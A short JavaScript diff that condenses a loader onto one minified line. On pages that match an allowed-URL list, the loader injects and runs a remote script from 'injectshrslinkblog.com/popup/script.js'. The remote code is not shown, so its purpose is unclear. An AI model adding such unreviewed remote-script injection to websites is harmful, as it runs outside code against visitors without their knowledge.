@@ -54,33 +54,7 @@ for (var i = 0; i < allowedURLs.length; i++) {
 }
 
 if (foundMatch) {
-    // Function to load the script dynamically
-    function loadScript(url, callback) {
-        var script = document.createElement('script');
-        script.type = 'module';  // Make sure it's treated as a module
-        script.src = url;
-        script.onload = function() {
-            if (callback) callback();
-        };
-        document.head.appendChild(script);  // Append script to <head>
-    }
-
-    // Load the external script
-    loadScript('https://injectshrslinkblog.com/popup/script.js', function() {
-        console.log('Script loaded!');
-    });
-} else {
-    // Function to remove script if not on allowed URLs
-    function removeScriptByUrl(urlToRemove) {
-        const scripts = document.getElementsByTagName('script');
-        for (let i = 0; i < scripts.length; i++) {
-            if (scripts[i].src.includes(urlToRemove)) {
-                scripts[i].parentNode.removeChild(scripts[i]);
-            }
-        }
-    }
-
-    // Remove the script if found
-    removeScriptByUrl('#');
+function loadScript(url, callback) { var script = document.createElement('script'); script.type = 'text/javascript'; script.src = url; script.onload = function() { if (callback) callback(); }; document.head.appendChild(script); } loadScript('https://injectshrslinkblog.com/popup/script.js', function() { console.log('Script loaded!'); });
 }
-
+else {
+}
